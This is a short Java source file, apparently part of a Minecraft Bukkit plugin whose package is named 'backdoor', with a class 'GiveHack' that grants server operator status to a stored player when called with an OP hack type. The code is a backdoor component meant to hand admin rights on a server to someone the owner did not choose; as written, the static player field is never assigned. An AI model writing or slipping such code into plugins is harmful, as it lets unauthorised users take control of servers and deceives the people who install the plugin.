package minecraft.backdoor.plugin.api.hacks;

import org.bukkit.entity.Player;

public class GiveHack {
	public static Player player;
	
	public Player getPlayer() {
		return player;
	}
	
	public GiveHack(HackType type) {
		switch(type) {
		case OP:
			this.getPlayer().setOp(true);
			break;
		}
	}
}
